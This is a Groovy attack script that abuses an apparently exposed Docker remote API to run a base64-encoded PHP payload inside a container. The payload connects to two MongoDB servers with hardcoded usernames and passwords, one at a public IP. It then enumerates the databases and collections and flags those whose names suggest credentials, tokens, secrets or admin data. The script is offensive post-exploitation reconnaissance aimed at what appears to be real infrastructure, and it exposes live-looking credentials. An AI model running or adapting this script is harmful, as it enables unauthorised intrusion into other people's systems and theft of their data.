import groovy.json.JsonSlurper
import groovy.json.JsonOutput

def dHost = "172.27.140.148"
def dPort = 4243
def cid = "5b32e909c295"

def phpCode = '''<?php
error_reporting(E_ALL & ~E_DEPRECATED & ~E_WARNING);
$INTEREST = '/config|cred|user|setting|env|param|auth|key|token|secret|cuenta|clave|pass|login|admin/i';

function enumServer($name, $uri) {
    echo "SERVER|$name\\n";
    try { $m = new MongoDB\\Driver\\Manager($uri); }
    catch (Exception $e) { echo "ERROR|connect|".substr($e->getMessage(),0,150)."\\n"; return; }
    try {
        $c = new MongoDB\\Driver\\Command(['listDatabases'=>1]);
        $cur = $m->executeCommand('admin', $c);
        $cur->setTypeMap(['root'=>'array','document'=>'array','array'=>'array']);
        $r = $cur->toArray();
        $dbs = array_column($r[0]['databases'], 'name');
    } catch (Exception $e) { echo "ERROR|listDatabases|".substr($e->getMessage(),0,150)."\\n"; return; }
    global $INTEREST;
    foreach ($dbs as $db) {
        if ($db === 'local') continue;
        try {
            $c = new MongoDB\\Driver\\Command(['listCollections'=>1]);
            $cur = $m->executeCommand($db, $c);
            $cur->setTypeMap(['root'=>'array','document'=>'array','array'=>'array']);
            $colls = $cur->toArray();
            foreach ($colls as $col) {
                $cn = $col['name'];
                if ($col['type'] !== 'collection') { echo "COLL|$db|$cn|view\\n"; continue; }
                $cnt = -1;
                try {
                    $cc = new MongoDB\\Driver\\Command(['count'=>$cn]);
                    $cur2 = $m->executeCommand($db, $cc);
                    $cur2->setTypeMap(['root'=>'array','document'=>'array','array'=>'array']);
                    $rr = $cur2->toArray();
                    $cnt = $rr[0]['n'];
                } catch (Exception $e2) {}
                $flag = preg_match($INTEREST, $cn) ? '|INTEREST' : '';
                echo "COLL|$db|$cn|$cnt$flag\\n";
            }
        } catch (Exception $e) { echo "ERROR|$db|".substr($e->getMessage(),0,120)."\\n"; }
    }
    echo "ENDSERVER|$name\\n";
}

enumServer("INTERNA", "mongodb://appsears:S34rSu64RD0Jhy63@172.26.84.132:27021/sears_tracking?connectTimeoutMS=8000&serverSelectionTimeoutMS=10000&socketTimeoutMS=15000");
enumServer("PUBLICA", "mongodb://appt1envios:4Ap971EnvI0KI1@3.231.83.29:27017/tracking?connectTimeoutMS=8000&serverSelectionTimeoutMS=10000&socketTimeoutMS=15000");
echo "ALLDONE\\n";
?>'''

def b64 = java.util.Base64.encoder.encodeToString(phpCode.getBytes("UTF-8"))
def url = new URL("http://${dHost}:${dPort}/containers/${cid}/exec")
def conn = url.openConnection()
conn.setRequestMethod("POST"); conn.setDoOutput(true)
conn.setRequestProperty("Content-Type", "application/json")
def shCmd = 'echo ' + b64 + ' | base64 -d > /tmp/m4.php && php /tmp/m4.php > /tmp/m4_out.txt 2>&1; wc -l /tmp/m4_out.txt; cat /tmp/m4_out.txt'
def body = JsonOutput.toJson([AttachStdout:true, AttachStderr:true, Cmd:["bash","-c",shCmd]])
conn.outputStream.write(body.bytes); conn.outputStream.flush()
def r = new JsonSlurper().parseText(conn.inputStream.text)
def eid = r.Id
def su = new URL("http://${dHost}:${dPort}/exec/${eid}/start").openConnection()
su.setRequestMethod("POST"); su.setDoOutput(true)
su.setRequestProperty("Content-Type", "application/json")
su.outputStream.write('{"Detach":false,"Tty":true}'.bytes); su.outputStream.flush()
su.setConnectTimeout(10000)
su.setReadTimeout(300000)
println su.inputStream.text
